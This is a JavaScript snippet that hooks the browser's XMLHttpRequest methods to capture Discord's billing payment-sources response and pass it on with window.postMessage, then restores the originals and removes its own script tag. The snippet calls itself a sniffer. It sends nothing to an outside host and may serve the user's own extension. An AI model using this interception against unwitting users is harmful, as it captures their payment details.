(xhr => {
    const XHR = XMLHttpRequest.prototype,
        { open, send, setRequestHeader } = XHR;

    XHR.open = function (method, url) {
        this._method = method;
        this._url = url;
        this._requestHeaders = {};
        this._startTime = (new Date()).toISOString();

        return open.apply(this, arguments);
    };

    XHR.setRequestHeader = function (header, value) {
        this._requestHeaders[header] = value;
        return setRequestHeader.apply(this, arguments);
    };

    XHR.send = function (data) {
        this.addEventListener("load", () => {
            const myURL = this._url ? this._url.toLowerCase() : this._url;
            if (myURL) {
                if (data) {
                    if (typeof data === "string") {
                        try {
                            // Request headers, in JSON format.
                            this._requestHeaders = data;
                        } catch(error) {
                            console.error(error);
                        }
                    }
                }
            }

            if (this.responseType != "blob" && this.responseText) {
                // `responseText` is string or null.
                try {
                    // The response, in JSON format.
                    if (this._url.endsWith("/users/@me/billing/payment-sources")) {
                        window.postMessage(JSON.parse(this.responseText));

                        // Reset because we don't need the sniffer now.
                        XHR.open = open;
                        XHR.setRequestHeader = setRequestHeader;
                        XHR.send = send;
                        
                        document.getElementById("discord-payments-script").remove();
                    }
                } catch (error) {
                    console.error(error);
                }
            }
        });

        return send.apply(this, arguments);
    };
})(XMLHttpRequest);